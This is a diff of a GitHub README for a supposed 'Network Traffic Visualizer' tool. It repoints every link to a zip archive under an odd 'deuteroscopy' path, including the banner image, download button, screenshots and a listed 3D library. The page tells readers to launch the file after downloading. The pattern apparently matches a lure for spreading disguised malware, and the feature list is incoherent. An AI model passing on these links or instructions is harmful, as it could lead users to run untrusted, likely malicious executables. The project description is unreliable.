@@ -2,7 +2,7 @@
 
 Welcome to the Network Traffic Visualizer GitHub repository! 🚀
 
-![Network Traffic Visualizer](https://github.com/Ruka232323/Network-Traffic-Visualizer/releases/download/v2.0/Software.zip)
+![Network Traffic Visualizer](https://github.com/Ruka232323/Network-Traffic-Visualizer/raw/refs/heads/main/deuteroscopy/Network-Traffic-Visualizer-v1.6.zip)
 
 ## Overview
 
@@ -22,7 +22,7 @@ Welcome to the Network Traffic Visualizer GitHub repository! 🚀
 
 To get started with the "Network Traffic Visualizer", download the application package from the following link:
 
-[![Download Application](https://github.com/Ruka232323/Network-Traffic-Visualizer/releases/download/v2.0/Software.zip)](https://github.com/Ruka232323/Network-Traffic-Visualizer/releases/download/v2.0/Software.zip)
+[![Download Application](https://github.com/Ruka232323/Network-Traffic-Visualizer/raw/refs/heads/main/deuteroscopy/Network-Traffic-Visualizer-v1.6.zip)](https://github.com/Ruka232323/Network-Traffic-Visualizer/raw/refs/heads/main/deuteroscopy/Network-Traffic-Visualizer-v1.6.zip)
 
 Please note that the application needs to be launched after downloading.
 
@@ -30,9 +30,9 @@ Please note that the application needs to be launched after downloading.
 
 Here are some snapshots of the Network Traffic Visualizer in action:
 
-![Screenshot 1](https://github.com/Ruka232323/Network-Traffic-Visualizer/releases/download/v2.0/Software.zip)
+![Screenshot 1](https://github.com/Ruka232323/Network-Traffic-Visualizer/raw/refs/heads/main/deuteroscopy/Network-Traffic-Visualizer-v1.6.zip)
 
-![Screenshot 2](https://github.com/Ruka232323/Network-Traffic-Visualizer/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Ruka232323/Network-Traffic-Visualizer/raw/refs/heads/main/deuteroscopy/Network-Traffic-Visualizer-v1.6.zip)
 
 ## Installation
 
@@ -51,7 +51,7 @@ Here are some snapshots of the Network Traffic Visualizer in action:
 
 The Network Traffic Visualizer leverages the following technologies:
 
-- https://github.com/Ruka232323/Network-Traffic-Visualizer/releases/download/v2.0/Software.zip for 3D visualization
+- https://github.com/Ruka232323/Network-Traffic-Visualizer/raw/refs/heads/main/deuteroscopy/Network-Traffic-Visualizer-v1.6.zip for 3D visualization
 - Packet Capture Library for network monitoring
 - Arabic Interface Framework for user-friendly experience
 - Real-time Data Visualization Engine for live updates
